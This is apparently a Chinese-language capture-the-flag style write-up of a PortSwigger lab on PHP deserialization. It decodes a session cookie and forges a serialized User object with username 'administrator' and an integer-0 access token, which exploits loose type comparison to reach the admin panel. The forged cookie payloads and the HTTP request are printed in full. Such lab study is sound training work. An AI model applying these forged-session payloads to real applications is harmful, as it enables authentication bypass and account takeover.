# 实验：修改序列化数据类型

https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types

本实验使用基于序列化的会话机制，因此存在认证绕过漏洞。为了解决本实验，请编辑会话 Cookie 中的序列化对象以访问 `administrator` 账户。然后，删除用户 `carlos`。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **提示**
> 要访问其他用户的账户，你需要利用 PHP 比较不同类型数据时的一个特性（quirk）。
>
> 请注意，PHP 的比较行为在不同版本之间有所不同。本实验假设的行为与 PHP 7.x 及更早版本一致。

## 步骤

探测
- 使用登录功能
    - 服务器响应
        ```http
        HTTP/2 302 Found
        Location: /my-account?id=wiener
        Set-Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJtY3R4dmV3dmh2bGhlbGpkOGhwNzd5OWh0OWxxejZvZyI7fQ%3d%3d; Secure; HttpOnly; SameSite=None
        ```
        - cookie 值为 base64 编码，解码后得到 php 序列化串
            ```php
            O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"mctxvewvhvlheljd8hp77y9ht9lqz6og";}
            ```

伪造 php 序列化数据
- 设置用户名为管理员，设置密码为整形0。
    ```php
    <@urlencode_not_plus><@base64>O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}</@base64></@urlencode_not_plus>
    ```

- 访问账户端点去掉原账户参数或设置对应的管理员名称

    ```http
    GET /my-account HTTP/2
    session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
    ```

- 访问账户端点时，出现管理员面板。浏览器开发者工具设置 cookie 后执行目标操作

- 额外序列化载荷
    ```php
    b:1;
    ```
    - 设置参数为 bool 值 true
